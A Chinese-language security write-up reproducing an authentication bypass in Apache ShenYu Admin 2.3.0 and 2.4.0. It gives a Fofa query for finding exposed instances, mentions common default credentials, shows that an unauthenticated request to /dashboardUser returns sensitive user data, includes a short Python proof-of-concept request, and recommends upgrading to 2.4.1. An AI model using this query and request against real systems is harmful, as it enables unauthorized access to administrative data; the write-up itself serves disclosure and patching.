![](https://image.3001.net/images/20211119/1637300948_61973ad4ac0699e21be8f.png!small)

## 漏洞说明

Apache ShenYu 是应用于所有微服务场景的，可扩展、高性能、响应式的 API 网关解决方案。

Apache ShenYu Admin 存在身份验证绕过漏洞。Shenyu Admin Bootstrap 中 JWT
的错误使用允许攻击者绕过身份验证，攻击者可通过该漏洞直接进入系统后台。

## 影响版本

  * Apache ShenYu 2.3.0
  * Apache ShenYu 2.4.0

## 漏洞复现

Fofa搜索标题：（注意：互联网的非授权利用属于违法行为）

    
    
    body="id=\"httpPath\""&&body="th:text=\"${domain}\"" 

访问首页如下所示：(ps:大多数存在默认口令admin/123456)![1637301367_61973c77d7069fd78f315.png!small](https://image.3001.net/images/20211119/1637301367_61973c77d7069fd78f315.png!small)

开启burp进行抓包，访问path：/dashboardUser

![1637301500_61973cfc352fdf421fcbb.png!small](https://image.3001.net/images/20211119/1637301500_61973cfc352fdf421fcbb.png!small)

可以看到Apache ShenYu 的JWT 认证体系并未进行身份验证就返回了敏感信息

![1637301631_61973d7f536eb68228b45.png!small](https://image.3001.net/images/20211119/1637301631_61973d7f536eb68228b45.png!small)

就是这么的丝滑，打完收工![1637301739_61973debea615b5dff4b7.png!small](https://image.3001.net/images/20211119/1637301739_61973debea615b5dff4b7.png!small)

部分代码：

    
    
    def target_url(url):
        target_url = url + "/dashboardUser"
        headers = {
           "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            }
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)

poc地址：<https://github.com/Henry4E36/apache-shenyu-authentication>

运行截图：

![1637302007_61973ef7b5d1ffe7b426d.png!small](https://image.3001.net/images/20211119/1637302007_61973ef7b5d1ffe7b426d.png!small)

## 修复建议

升级至最新安全版本 Apache ShenYu 2.4.1

下载地址：<https://shenyu.apache.org/zh/download>

  

本文章仅用于学习交流，不得用于非法用途

